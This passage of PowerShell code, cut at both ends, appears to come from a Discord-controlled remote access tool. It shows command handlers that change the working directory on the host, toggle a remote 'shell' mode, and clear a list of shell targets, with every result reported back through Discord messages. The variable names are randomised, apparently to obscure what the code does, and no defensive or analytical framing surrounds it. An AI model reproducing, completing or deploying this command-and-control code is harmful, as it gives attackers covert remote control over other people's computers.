                    if (Test-Path -LiteralPath $XfeP -PathType Container) { $script:workDir = (Get-Item -LiteralPath $XfeP).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $msgId }
                    else { Send-DiscordMessage -Content "not found" -ReplyToId $msgId }
                } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                return
            }
            "shell" {
                $bndCZBqZ = $BktMd.Trim().ToLower()
                if ($bndCZBqZ -eq "on") { $script:shellMode = $true; Send-DiscordMessage -Content "shell ON" -ReplyToId $msgId }
                elseif ($bndCZBqZ -eq "off") { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $msgId }
                else { Send-DiscordMessage -Content "shell: $(if($script:shellMode){'ON'}else{'OFF'})" -ReplyToId $msgId }
                return
            }
            "shellon" {
                $script:shellTargets.Clear()
